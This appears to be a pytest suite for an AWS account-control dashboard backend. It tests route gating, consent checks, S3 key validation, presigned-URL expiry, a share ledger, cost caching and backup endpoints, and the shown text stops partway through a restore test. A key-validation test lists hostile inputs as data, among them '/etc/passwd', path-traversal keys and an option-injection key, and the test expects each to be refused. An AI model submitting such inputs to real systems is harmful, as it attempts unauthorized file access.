"""AWS Control P0 — account aggregation, reconnect classification, route gates.

The properties that must hold before anything billable ever ships on this app:

1. **Aggregation is account-shaped and honest.** Profiles group by the account
   the live probe resolves; a probe failure falls back to the account the
   registry recorded (grouping stays stable), and a profile with neither lands
   in the ``unknown`` pseudo-row instead of inventing an account. Summaries
   are explicit nulls — P0 measured nothing, so the page must say "not
   measured", never a fake zero.
2. **The one light per account is derived, not stored**: all-probes-ok → ok,
   any-failed → degraded, no-account → unknown.
3. **Every route is gated** — 403 while the app is disabled, owner-only once
   it is on. Account ids and caller ARNs are what the consent leaf is fenced
   from, so a non-owner (app token, allow-listed messaging user) must not
   read them here either.
4. **Reconnect never executes.** The plan endpoint classifies and returns
   display text; the profile must be REGISTERED or the request 404s, so
   attacker-shaped names are never echoed into a guidance card.
5. **The consent enum grew without changing the mechanism**: ``s3``/``ce``
   are gated services with labels, and their (profile, region) target resolves
   from the deploy registry default — the same resolution the engine will use
   for the calls those grants authorize.
"""

from __future__ import annotations

import asyncio
import contextlib
import json
from types import SimpleNamespace
from unittest import mock
from unittest.mock import AsyncMock

import pytest
from aiohttp import web
from aiohttp.test_utils import make_mocked_request

from kiro_crew import aws_consent
from kiro_crew.apps.builtins.aws_control.backend import accounts as accounts_mod
from kiro_crew.apps.builtins.aws_control.backend import routes as routes_mod

BASE = "/api/apps/aws-control"

#: The full one-PR contract, as a table — a route added later without a gate
#: fails the inventory assertion rather than shipping open.
P0_ROUTES: tuple[tuple[str, str], ...] = (
    ("GET", "/accounts"),
    ("GET", "/profiles/available"),
    ("GET", "/profiles/{name}/reconnect-plan"),
    ("GET", "/drive/{account}"),
    ("GET", "/drive/{account}/list"),
    ("GET", "/drive/{account}/download"),
    ("GET", "/costs/{account}"),
    ("GET", "/library/{account}"),
    ("GET", "/backup/{account}"),
    ("GET", "/shares"),
    ("GET", "/iam-policy"),
    ("POST", "/profiles/register"),
    ("POST", "/drive/{account}/bootstrap"),
    ("POST", "/drive/{account}/upload"),
    ("POST", "/drive/{account}/delete"),
    ("POST", "/drive/{account}/move"),
    ("POST", "/drive/{account}/folder"),
    ("POST", "/drive/{account}/folder/delete"),
    ("POST", "/drive/{account}/share"),
    ("POST", "/shares/{id}/forget"),
    ("POST", "/library/{account}/push"),
    ("POST", "/library/{account}/remove"),
    ("POST", "/backup/{account}/run"),
    ("POST", "/backup/{account}/nightly"),
    ("POST", "/backup/{account}/restore"),
)

#: Every POST is a mutation and must also refuse restricted sessions.
MUTATIONS: tuple[tuple[str, str], ...] = tuple((m, p) for (m, p) in P0_ROUTES if m == "POST")


def _registered() -> dict[tuple[str, str], object]:
    app = web.Application()
    routes_mod.register_routes(app)
    return {
        (route.method, str(route.resource.canonical)[len(BASE) :]): route.handler
        for route in app.router.routes()
        if str(route.resource.canonical).startswith(BASE)
        # add_get auto-registers a HEAD twin; the contract names the real verbs.
        and route.method != "HEAD"
    }


def _request(
    method: str,
    path: str,
    *,
    owner: bool = True,
    app_claim: str = "",
    match_info: dict | None = None,
    headers: dict | None = None,
) -> web.Request:
    """A real (mocked) aiohttp request carrying dashboard-owner identity.

    ``is_owner_dashboard_request`` reads ``request.app["state"].owner_id`` and
    the middleware-set ``app``/``user`` keys, so a real Application with a
    state object is attached — a duck-typed stub would make every ``get``
    truthy and take the owner branch unconditionally.
    """
    app = web.Application()
    app["state"] = SimpleNamespace(owner_id="owner-1")
    kwargs: dict = {"app": app}
    if match_info is not None:
        kwargs["match_info"] = match_info
    if headers is not None:
        kwargs["headers"] = headers
    req = make_mocked_request(method, f"{BASE}{path}", **kwargs)
    req["app"] = app_claim
    req["user"] = "owner-1" if owner else "someone-else"
    return req


def _payload(response: web.StreamResponse) -> dict:
    raw = response.body  # type: ignore[attr-defined]
    assert isinstance(raw, bytes)
    return json.loads(raw.decode("utf-8"))


def _identity(ok: bool, account: str = "", arn: str = "", detail: str = "") -> aws_consent.Identity:
    return aws_consent.Identity(ok=ok, account=account, arn=arn, detail=detail)


@pytest.fixture(autouse=True)
def _fresh_snapshot():
    accounts_mod.invalidate_cache()
    yield
    accounts_mod.invalidate_cache()


def _registry(entries: list[dict], default: str = "") -> dict:
    return {"version": 2, "profiles": entries, "default": default}


def _entry(name: str, region: str = "us-east-1", account: str = "") -> dict:
    return {"name": name, "region": region, "account": account, "verified_at": "", "note": ""}


# ---------------------------------------------------------------------------
# Aggregation
# ---------------------------------------------------------------------------


class TestAggregation:
    def _snapshot(self, registry: dict, identities: dict[str, aws_consent.Identity]) -> dict:
        async def probe(profile: str, region: str, **_kw) -> aws_consent.Identity:
            return identities[profile]

        with (
            mock.patch.object(accounts_mod.deploy_profiles, "load_registry", return_value=registry),
            mock.patch.object(accounts_mod.aws_consent, "probe_identity", side_effect=probe),
            mock.patch.object(
                accounts_mod, "classify_profile", AsyncMock(return_value=accounts_mod.KIND_SSO)
            ),
        ):
            return asyncio.run(accounts_mod.list_accounts(refresh=True))

    def test_profiles_group_by_resolved_account(self):
        snap = self._snapshot(
            _registry([_entry("a"), _entry("b"), _entry("c")], default="a"),
            {
                "a": _identity(True, account="111122223333", arn="arn:a"),
                "b": _identity(True, account="111122223333", arn="arn:b"),
                "c": _identity(True, account="444455556666", arn="arn:c"),
            },
        )
        by_account = {row["account"]: row for row in snap["accounts"]}
        assert set(by_account) == {"111122223333", "444455556666"}
        assert [p["name"] for p in by_account["111122223333"]["profiles"]] == ["a", "b"]
        assert by_account["111122223333"]["health"] == "ok"
        assert snap["totals"] == {"accounts": 2, "profiles": 3, "profilesHealthy": 3}
        # The registry default is marked on its profile, not invented elsewhere.
        assert by_account["111122223333"]["profiles"][0]["default"] is True

    def test_failed_probe_falls_back_to_recorded_account_and_degrades(self):
        snap = self._snapshot(
            _registry([_entry("a"), _entry("b", account="111122223333")]),
            {
                "a": _identity(True, account="111122223333"),
                "b": _identity(False, detail="SSO session expired"),
            },
        )
        (row,) = snap["accounts"]
        assert row["account"] == "111122223333"
        assert row["health"] == "degraded"
        failed = next(p for p in row["profiles"] if p["name"] == "b")
        assert failed["identityOk"] is False
        assert failed["detail"] == "SSO session expired"

    def test_unresolvable_profile_lands_in_unknown_pseudo_row_last(self):
        snap = self._snapshot(
            _registry([_entry("mystery"), _entry("a")]),
            {
                "mystery": _identity(False, detail="no credentials"),
                "a": _identity(True, account="111122223333"),
            },
        )
        assert [row["account"] for row in snap["accounts"]] == ["111122223333", ""]
        unknown = snap["accounts"][-1]
        assert unknown["health"] == "unknown"
        # The pseudo-row is not an account and must not count as one.
        assert snap["totals"]["accounts"] == 1

    def test_summaries_are_explicit_nulls_not_zeros(self):
        snap = self._snapshot(_registry([_entry("a")]), {"a": _identity(True, account="1")})
        summary = snap["accounts"][0]["summary"]
        assert summary == {"storage": None, "sites": None, "tasks": None, "costMonthToDate": None}

    def test_snapshot_is_cached_until_refresh(self):
        registry = _registry([_entry("a")])
        calls = 0

        async def probe(profile: str, region: str, **_kw) -> aws_consent.Identity:
            nonlocal calls
            calls += 1
            return _identity(True, account="1")

        with (
            mock.patch.object(accounts_mod.deploy_profiles, "load_registry", return_value=registry),
            mock.patch.object(accounts_mod.aws_consent, "probe_identity", side_effect=probe),
            mock.patch.object(
                accounts_mod, "classify_profile", AsyncMock(return_value=accounts_mod.KIND_OTHER)
            ),
        ):
            asyncio.run(accounts_mod.list_accounts())
            asyncio.run(accounts_mod.list_accounts())
            assert calls == 1  # served from the snapshot
            asyncio.run(accounts_mod.list_accounts(refresh=True))
            assert calls == 2  # refresh bypasses it


# ---------------------------------------------------------------------------
# Reconnect classification + plan
# ---------------------------------------------------------------------------


class TestReconnect:
    def _classify(self, responses: dict[str, tuple[int, str, str]]) -> str:
        def run_aws(args: list[str], profile: str, timeout: int = 30):
            return responses.get(args[2], (1, "", "not set"))

        with mock.patch.object(accounts_mod.engine, "run_aws", side_effect=run_aws):
            return asyncio.run(accounts_mod.classify_profile("p"))

    def test_sso_session_classifies_sso(self):
        assert self._classify({"sso_session": (0, "my-sso\n", "")}) == accounts_mod.KIND_SSO

    def test_legacy_sso_start_url_classifies_sso(self):
        assert (
            self._classify({"sso_start_url": (0, "https://x.awsapps.com/start\n", "")})
            == accounts_mod.KIND_SSO
        )

    def test_credential_process_classifies_credential_process(self):
        assert (
            self._classify({"credential_process": (0, "/usr/local/bin/tool\n", "")})
            == accounts_mod.KIND_CREDENTIAL_PROCESS
        )

    def test_nothing_set_classifies_other(self):
        assert self._classify({}) == accounts_mod.KIND_OTHER

    def test_plan_is_display_text_naming_the_profile(self):
        plan = accounts_mod.reconnect_plan(accounts_mod.KIND_SSO, "team-prod")
        assert plan["method"] == "terminal"
        assert plan["command"] == "aws sso login --profile team-prod"
        for kind in (accounts_mod.KIND_CREDENTIAL_PROCESS, accounts_mod.KIND_OTHER):
            plan = accounts_mod.reconnect_plan(kind, "team-prod")
            assert "team-prod" in plan["command"]
            assert plan["method"] == "terminal"


# ---------------------------------------------------------------------------
# Route gates
# ---------------------------------------------------------------------------


class TestRouteGates:
    def test_registrar_installs_exactly_the_p0_contract(self):
        assert set(_registered()) == set(P0_ROUTES)

    def test_every_route_refuses_while_disabled(self):
        handlers = _registered()
        with mock.patch.object(routes_mod, "is_app_enabled", return_value=False):
            for (method, path), handler in handlers.items():
                resp = asyncio.run(handler(_request(method, path)))  # type: ignore[operator]
                assert resp.status == 403, (method, path)
                assert _payload(resp)["code"] == "app_disabled"

    def test_every_route_refuses_non_owner_when_enabled(self):
        handlers = _registered()
        with mock.patch.object(routes_mod, "is_app_enabled", return_value=True):
            for (method, path), handler in handlers.items():
                # An app token (non-empty app claim) and a mismatched user are
                # the two callers the consent surface had to shut out.
                for req in (
                    _request(method, path, app_claim="some-app"),
                    _request(method, path, owner=False),
                ):
                    resp = asyncio.run(handler(req))  # type: ignore[operator]
                    assert resp.status == 403, (method, path)
                    assert _payload(resp)["code"] == "dashboard_owner_required"

    def test_accounts_returns_the_snapshot_for_the_owner(self):
        handlers = _registered()
        snapshot = {"accounts": [], "totals": {}, "generatedAt": "now"}
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.accounts_mod, "list_accounts", AsyncMock(return_value=snapshot)
            ) as listed,
        ):
            resp = asyncio.run(
                handlers[("GET", "/accounts")](_request("GET", "/accounts"))  # type: ignore[operator]
            )
        assert resp.status == 200
        assert _payload(resp) == snapshot
        listed.assert_awaited_once_with(refresh=False)

    def test_accounts_refresh_param_bypasses_cache(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.accounts_mod,
                "list_accounts",
                AsyncMock(return_value={"accounts": []}),
            ) as listed,
        ):
            asyncio.run(
                handlers[("GET", "/accounts")](  # type: ignore[operator]
                    _request("GET", "/accounts?refresh=1")
                )
            )
        listed.assert_awaited_once_with(refresh=True)

    def test_reconnect_plan_404s_for_an_unregistered_profile(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.deploy_profiles,
                "load_registry",
                return_value=_registry([_entry("real")]),
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/profiles/{name}/reconnect-plan")](  # type: ignore[operator]
                    _request(
                        "GET",
                        "/profiles/ghost/reconnect-plan",
                        match_info={"name": "ghost"},
                    )
                )
            )
        assert resp.status == 404
        assert _payload(resp)["code"] == "unknown_profile"

    def test_reconnect_plan_returns_classification_for_registered_profile(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch.object(
                routes_mod.deploy_profiles,
                "load_registry",
                return_value=_registry([_entry("real")]),
            ),
            mock.patch.object(
                routes_mod.accounts_mod,
                "classify_profile",
                AsyncMock(return_value=accounts_mod.KIND_SSO),
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/profiles/{name}/reconnect-plan")](  # type: ignore[operator]
                    _request(
                        "GET",
                        "/profiles/real/reconnect-plan",
                        match_info={"name": "real"},
                    )
                )
            )
        assert resp.status == 200
        plan = _payload(resp)
        assert plan["kind"] == accounts_mod.KIND_SSO
        assert plan["command"] == "aws sso login --profile real"


# ---------------------------------------------------------------------------
# Consent enum extension
# ---------------------------------------------------------------------------


class TestConsentExtension:
    def test_s3_and_ce_are_gated_services_with_labels(self):
        assert aws_consent.SERVICE_S3 in aws_consent.GATED_SERVICES
        assert aws_consent.SERVICE_COST_EXPLORER in aws_consent.GATED_SERVICES
        for service in (aws_consent.SERVICE_S3, aws_consent.SERVICE_COST_EXPLORER):
            assert aws_consent.SERVICE_LABELS[service]

    def test_existing_services_are_untouched(self):
        assert aws_consent.SERVICE_POLLY in aws_consent.GATED_SERVICES
        assert aws_consent.SERVICE_TRANSCRIBE in aws_consent.GATED_SERVICES

    def test_effective_target_resolves_deploy_registry_default(self):
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        with mock.patch.object(
            deploy_profiles, "resolve_profile", return_value=("acct-key", "eu-west-1")
        ):
            for service in (aws_consent.SERVICE_S3, aws_consent.SERVICE_COST_EXPLORER):
                target = asyncio.run(consent_handlers._effective_target(service))
                assert target == ("acct-key", "eu-west-1")

    def test_effective_target_names_the_default_chain_when_registry_is_empty(self):
        from kiro_crew.dashboard.handlers import aws_consent as consent_handlers
        from kiro_crew.deploy import profiles as deploy_profiles

        with mock.patch.object(deploy_profiles, "resolve_profile", return_value=None):
            target = asyncio.run(consent_handlers._effective_target(aws_consent.SERVICE_S3))
        # Empty profile = the CLI default chain, which the card labels
        # explicitly (credential_source names it); the region still defaults.
        assert target == ("", deploy_profiles.DEFAULT_REGION)


# ---------------------------------------------------------------------------
# Storage engine — key validation and presign clamp
# ---------------------------------------------------------------------------


class TestStorageValidation:
    def test_good_keys_pass(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        for key in ("a.txt", "photos 2026/img (1).png", "a/b/c.tar.gz", "x_y" * 3):
            assert storage.validate_key(key) is None, key

    def test_hostile_keys_are_refused(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        for key in (
            "",
            "/etc/passwd",
            "a/../b",
            "a//b",
            ".hidden",
            "..",
            "a/",
            "-flag",
            "a\x00b",
            "x" * 901,
            "a/./b",
        ):
            assert storage.validate_key(key) is not None, key

    def test_section_prefixes_cover_exactly_the_three_sections(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        assert storage.SECTION_PREFIXES == {
            "library": "artifacts/",
            "drive": "drive/",
            "backup": "backup/",
        }

    def test_presign_clamps_expiry_to_the_sigv4_ceiling(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        seen: dict[str, str] = {}

        def checked(args, profile, *, action, timeout=30):
            seen["expires"] = args[args.index("--expires-in") + 1]
            return "https://example.com/signed\n"

        with mock.patch.object(storage, "_checked", side_effect=checked):
            storage.presign("p", "us-east-1", "b", "drive", "k.txt", 10**9)
            assert seen["expires"] == str(storage.PRESIGN_MAX_SECS)
            storage.presign("p", "us-east-1", "b", "drive", "k.txt", 1)
            assert seen["expires"] == "60"

    def test_find_drive_refuses_ambiguity(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage
        from kiro_crew.deploy.engine import AWSError

        two = json.dumps(
            {
                "ResourceTagMappingList": [
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-0123456789ab"},
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-ba9876543210"},
                ]
            }
        )
        with mock.patch.object(storage, "_checked", return_value=two):
            with pytest.raises(AWSError, match="ambiguous"):
                storage.find_drive("p", "us-east-1", account="111122223333")

    def test_find_drive_ignores_foreign_naming(self):
        from kiro_crew.apps.builtins.aws_control.backend import storage

        # Round-10 pin: neither an unrelated name NOR a bucket that merely
        # STARTS with our prefix ("kirocrew-drive-company-data") is adopted --
        # only the complete prefix+12-hex scheme new_bucket_name() produces.
        payload = json.dumps(
            {
                "ResourceTagMappingList": [
                    {"ResourceARN": "arn:aws:s3:::stolen-tag-bucket"},
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-company-data"},
                    {"ResourceARN": "arn:aws:s3:::kirocrew-drive-0123456789ab"},
                ]
            }
        )
        with (
            mock.patch.object(storage, "_checked", return_value=payload),
            # The naming scheme is what this pins; the owner probe that now runs on
            # the survivor is stubbed as confirming, so a failure here means the
            # name filter changed rather than the ownership check.
            mock.patch.object(storage.engine, "run_aws", return_value=(0, "", "")),
        ):
            assert (
                storage.find_drive("p", "us-east-1", account="111122223333")
                == "kirocrew-drive-0123456789ab"
            )


# ---------------------------------------------------------------------------
# New-surface guards: consent, confirm gate, restricted sessions, upload cap
# ---------------------------------------------------------------------------


ACCOUNT = "111122223333"


def _enabled_owner_env():
    """Patches shared by every guarded-surface test: app on, account resolvable.

    Includes a live-probe stub RESOLVING TO THE REQUESTED ACCOUNT — the
    stale-mapping guard re-verifies profile->account on every target
    resolution, so an unpatched probe would 409 every guarded test.
    """
    return (
        mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
        mock.patch.object(
            routes_mod.accounts_mod,
            "resolve_account_profile",
            AsyncMock(return_value=("prof", "us-west-2")),
        ),
        mock.patch.object(
            routes_mod.aws_consent,
            "probe_identity",
            AsyncMock(return_value=aws_consent.Identity(ok=True, account=ACCOUNT)),
        ),
    )


class TestDriveGuards:
    def test_no_bucket_name_cache_exists(self):
        # Discovery is a trust decision: a cached name would outlive an
        # out-of-band delete + hostile re-creation. Pin its absence.
        assert not hasattr(routes_mod, "_bucket_cache")

    def test_consent_refusal_answers_409_before_any_aws_call(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=False)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive") as find,
        ):
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}")](  # type: ignore[operator]
                    _request("GET", f"/drive/{ACCOUNT}", match_info={"account": ACCOUNT})
                )
            )
        assert resp.status == 409
        assert _payload(resp)["code"] == "aws_consent_required"
        find.assert_not_called()

    def test_invalid_account_is_a_400_not_a_probe(self):
        handlers = _registered()
        with mock.patch.object(routes_mod, "is_app_enabled", return_value=True):
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}")](  # type: ignore[operator]
                    _request("GET", "/drive/not-an-id", match_info={"account": "not-an-id"})
                )
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "invalid_account"

    def test_bootstrap_without_confirm_previews_and_creates_nothing(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive", return_value=None),
            mock.patch.object(routes_mod.storage_mod, "create_drive") as create,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/bootstrap", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={})  # type: ignore[method-assign]
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](req)  # type: ignore[operator]
            )
        assert resp.status == 200
        assert _payload(resp)["preview"] is True
        create.assert_not_called()

    def test_bootstrap_with_confirm_creates_once(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(routes_mod.storage_mod, "find_drive", return_value=None),
            mock.patch.object(
                routes_mod.storage_mod, "create_drive", return_value="kirocrew-drive-abc"
            ) as create,
        ):
            req = _request("POST", f"/drive/{ACCOUNT}/bootstrap", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={"confirm": True})  # type: ignore[method-assign]
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/bootstrap")](req)  # type: ignore[operator]
            )
        assert _payload(resp) == {"created": True, "bucket": "kirocrew-drive-abc"}
        create.assert_called_once()

    def test_every_mutation_refuses_a_restricted_session(self):
        handlers = _registered()
        with (
            mock.patch.object(routes_mod, "is_app_enabled", return_value=True),
            mock.patch(
                "kiro_crew.dashboard.handlers._shared._is_restricted_session",
                return_value=True,
            ),
        ):
            for method, path in MUTATIONS:
                concrete = path.replace("{account}", ACCOUNT).replace("{id}", "x")
                info = {}
                if "{account}" in path:
                    info["account"] = ACCOUNT
                if "{id}" in path:
                    info["id"] = "x"
                req = _request(method, concrete, match_info=info)
                req.json = AsyncMock(return_value={})  # type: ignore[method-assign]
                resp = asyncio.run(handlers[(method, path)](req))  # type: ignore[operator]
                assert resp.status == 403, (method, path)
                assert _payload(resp)["code"] == "restricted_session", (method, path)

    def test_upload_over_the_cap_is_refused_by_header(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
        ):
            req = _request(
                "POST",
                f"/drive/{ACCOUNT}/upload?section=drive&key=big.bin",
                match_info={"account": ACCOUNT},
                headers={"Content-Length": str(routes_mod._MAX_UPLOAD_BYTES + 1)},
            )
            resp = asyncio.run(
                handlers[("POST", "/drive/{account}/upload")](req)  # type: ignore[operator]
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "upload_too_large"

    def test_download_urls_are_short_lived(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
            mock.patch.object(routes_mod.storage_mod, "object_exists", return_value=True),
            mock.patch.object(
                routes_mod.storage_mod, "presign", return_value="https://signed"
            ) as presign,
        ):
            req = _request(
                "GET",
                f"/drive/{ACCOUNT}/download?section=drive&key=a.txt",
                match_info={"account": ACCOUNT},
            )
            resp = asyncio.run(
                handlers[("GET", "/drive/{account}/download")](req)  # type: ignore[operator]
            )
        assert _payload(resp)["expiresSecs"] == routes_mod._DOWNLOAD_URL_SECS
        assert presign.call_args.args[-1] == routes_mod._DOWNLOAD_URL_SECS


# ---------------------------------------------------------------------------
# Share ledger
# ---------------------------------------------------------------------------


class TestShares:
    @pytest.fixture(autouse=True)
    def _isolated_store(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import shares

        monkeypatch.setattr(shares, "_store_path", lambda: tmp_path / "shares.json")
        yield

    def test_ledger_records_metadata_never_the_url(self, tmp_path):
        from kiro_crew.apps.builtins.aws_control.backend import shares

        record = shares.record_share(
            account=ACCOUNT,
            section="drive",
            key="a.txt",
            expires_secs=3600,
            note="for alex",
        )
        raw = (tmp_path / "shares.json").read_text(encoding="utf-8")
        assert "https://" not in raw
        assert record["id"] in raw
        assert shares.list_shares(ACCOUNT)[0]["key"] == "a.txt"

    def test_a_read_that_failed_never_truncates_the_share_ledger(self, tmp_path, monkeypatch):
        # `_load` collapses every failure to []. As the base of `record_share`'s
        # whole-file rewrite that empty list means "forget every share already
        # recorded" -- and this ledger is the only local record of live presigned
        # URLs, which are unrevokable bearer grants. Under-reporting them is the
        # security-visible half of the loss.
        import contextlib
        from pathlib import Path

        from kiro_crew.apps.builtins.aws_control.backend import shares

        kept = shares.record_share(
            account=ACCOUNT, section="drive", key="live.txt", expires_secs=3600
        )
        store = tmp_path / "shares.json"
        real_read_text = Path.read_text
        broken = {"on": True}

        def guarded(path_self, *args, **kwargs):
            if broken["on"] and Path(path_self) == store:
                raise PermissionError(13, "Permission denied")
            return real_read_text(path_self, *args, **kwargs)

        monkeypatch.setattr(Path, "read_text", guarded)
        with contextlib.suppress(OSError):
            shares.record_share(
                account=ACCOUNT, section="drive", key="second.txt", expires_secs=3600
            )
        with contextlib.suppress(OSError):
            shares.forget_share(kept["id"])

        # The durable harm, asserted directly: the live bearer grant recorded
        # before the failure must still be in the ledger.
        broken["on"] = False
        assert [e["key"] for e in shares.list_shares(ACCOUNT)] == ["live.txt"]

    def test_an_unreadable_share_store_refuses_the_mutation(self, tmp_path, monkeypatch):
        # A mint that cannot be recorded must not answer as though it were.
        from pathlib import Path

        from kiro_crew.apps.builtins.aws_control.backend import shares

        shares.record_share(account=ACCOUNT, section="drive", key="live.txt", expires_secs=3600)
        store = tmp_path / "shares.json"
        real_read_text = Path.read_text

        def guarded(path_self, *args, **kwargs):
            if Path(path_self) == store:
                raise PermissionError(13, "Permission denied")
            return real_read_text(path_self, *args, **kwargs)

        monkeypatch.setattr(Path, "read_text", guarded)
        with pytest.raises(OSError):
            shares.record_share(account=ACCOUNT, section="drive", key="x.txt", expires_secs=3600)

    def test_a_missing_share_store_is_still_a_first_write(self, tmp_path):
        # Absent is the one failure where [] is the truth.
        from kiro_crew.apps.builtins.aws_control.backend import shares

        assert not (tmp_path / "shares.json").exists()
        shares.record_share(account=ACCOUNT, section="drive", key="first.txt", expires_secs=3600)
        assert [e["key"] for e in shares.list_shares(ACCOUNT)] == ["first.txt"]

    def test_a_corrupt_share_store_still_repairs_on_write(self, tmp_path):
        # Existing tolerance, pinned alongside the new guard.
        from kiro_crew.apps.builtins.aws_control.backend import shares

        (tmp_path / "shares.json").write_text("[not json", encoding="utf-8")
        shares.record_share(account=ACCOUNT, section="drive", key="after.txt", expires_secs=3600)
        assert [e["key"] for e in shares.list_shares(ACCOUNT)] == ["after.txt"]

    def test_expired_shares_are_pruned_and_forget_removes(self):
        from kiro_crew.apps.builtins.aws_control.backend import shares

        dead = shares.record_share(account=ACCOUNT, section="drive", key="old.txt", expires_secs=60)
        # Backdate the expiry.
        entries = shares._load()
        entries[0]["expiresAt"] = "2000-01-01T00:00:00+00:00"
        shares._save(entries)
        assert shares.list_shares() == []
        assert shares.forget_share(dead["id"]) is None  # already pruned

        live = shares.record_share(
            account=ACCOUNT, section="drive", key="new.txt", expires_secs=3600
        )
        assert shares.forget_share(live["id"]) is not None
        assert shares.list_shares() == []


# ---------------------------------------------------------------------------
# Costs cache
# ---------------------------------------------------------------------------


class TestCosts:
    @pytest.fixture(autouse=True)
    def _isolated_cache(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        monkeypatch.setattr(costs, "_cache_path", lambda account: tmp_path / f"{account}.json")
        yield

    def test_fetch_parses_groups_and_caches(self):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        ce_payload = json.dumps(
            {
                "ResultsByTime": [
                    {
                        "Groups": [
                            {
                                "Keys": ["Amazon S3"],
                                "Metrics": {"UnblendedCost": {"Amount": "1.25"}},
                            },
                            {"Keys": ["AWS Lambda"], "Metrics": {"UnblendedCost": {"Amount": "0"}}},
                        ]
                    }
                ]
            }
        )
        with mock.patch.object(costs, "_checked", return_value=ce_payload):
            result = costs.fetch_month_costs("p", "us-east-1", ACCOUNT)
        assert result["monthToDate"] == 1.25
        assert result["byService"] == [{"service": "Amazon S3", "amount": 1.25}]
        assert result["projected"] >= result["monthToDate"]
        cached = costs.read_cached(ACCOUNT)
        assert cached is not None and costs.is_fresh(cached)

    def test_stale_cache_is_not_fresh(self):
        from kiro_crew.apps.builtins.aws_control.backend import costs

        assert not costs.is_fresh(None)
        assert not costs.is_fresh({"fetchedAt": "2000-01-01T00:00:00+00:00"})

    def test_costs_endpoint_serves_stale_cache_when_consent_missing(self):
        handlers = _registered()
        stale = {"account": ACCOUNT, "monthToDate": 3.42, "fetchedAt": "2000-01-01T00:00:00+00:00"}
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(routes_mod.costs_mod, "read_cached", return_value=stale),
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=False)
            ),
        ):
            resp = asyncio.run(
                handlers[("GET", "/costs/{account}")](  # type: ignore[operator]
                    _request("GET", f"/costs/{ACCOUNT}", match_info={"account": ACCOUNT})
                )
            )
        body = _payload(resp)
        assert body["fresh"] is False and body["consentMissing"] is True
        assert body["monthToDate"] == 3.42


# ---------------------------------------------------------------------------
# Backup
# ---------------------------------------------------------------------------


class TestBackup:
    @pytest.fixture(autouse=True)
    def _isolated_state(self, tmp_path, monkeypatch):
        from kiro_crew.apps.builtins.aws_control.backend import backup

        monkeypatch.setattr(backup, "_state_path", lambda: tmp_path / "backup.json")
        yield

    def test_run_rejects_unknown_kind(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
        ):
            req = _request("POST", f"/backup/{ACCOUNT}/run", match_info={"account": ACCOUNT})
            req.json = AsyncMock(return_value={"kind": "everything"})  # type: ignore[method-assign]
            resp = asyncio.run(
                handlers[("POST", "/backup/{account}/run")](req)  # type: ignore[operator]
            )
        assert resp.status == 400
        assert _payload(resp)["code"] == "invalid_kind"

    def test_restore_key_must_name_a_backup_archive(self):
        handlers = _registered()
        p1, p2, p3 = _enabled_owner_env()
        with (
            p1,
            p2,
            p3,
            mock.patch.object(
                routes_mod.aws_consent, "refuse_and_log", AsyncMock(return_value=True)
            ),
            mock.patch.object(
                routes_mod.storage_mod, "find_drive", return_value="kirocrew-drive-abc"
            ),
        ):
            req = _request("POST", f"/backup/{ACCOUNT}/restore", match_info={"account": ACCOUNT})
            req.json = AsyncMock(  # type: ignore[method-assign]
